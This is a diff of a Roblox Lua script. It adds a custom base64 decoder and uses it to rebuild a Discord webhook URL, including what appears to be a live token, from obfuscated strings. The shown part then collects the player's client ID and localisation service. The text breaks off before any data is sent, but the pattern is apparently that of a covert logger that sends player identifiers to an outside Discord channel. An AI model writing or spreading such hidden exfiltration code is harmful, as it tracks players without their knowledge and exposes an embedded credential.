@@ -1,10 +1,26 @@
 local HttpService = game:GetService("HttpService")
 
+function from_base64(data)
+    local b = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
+    data = string.gsub(data, '[^'..b..'=]', '')
+    return (data:gsub('.', function(x)
+        if (x == '=') then return '' end
+        local r,f='',(b:find(x)-1)
+        for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
+        return r;
+    end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
+        if (#x ~= 8) then return '' end
+        local c=0
+        for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
+        return string.char(c)
+    end))
+end
+
 local whbase = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3Mv"
 local whId = "MTMzMTM2NTY2MjA1MTkyNjEzOA=="
 local wht = "TXh6XzI4VnppRl9DV1JRTm5zTklvOHdCbXZYYVJuOVR1dVVuWmR4aE92N0hSVWZWMVBIWk5BTWZOZjhwNWxEbTcyQ3E="
 
-local Webhook_ URL= HttpService:Base64Decode(whbase) .. HttpService:Base64Decode(whId) .. "/" .. HttpService:Base64Decode(wht)
+local Webhook_URL = from_base64(whbase) .. from_base64(whId) .. "/" .. from_base64(wht)
 
 local ls = game:GetService("LocalizationService")
 local S_hwid = game:GetService("RbxAnalyticsService"):GetClientId() or "Unknown"
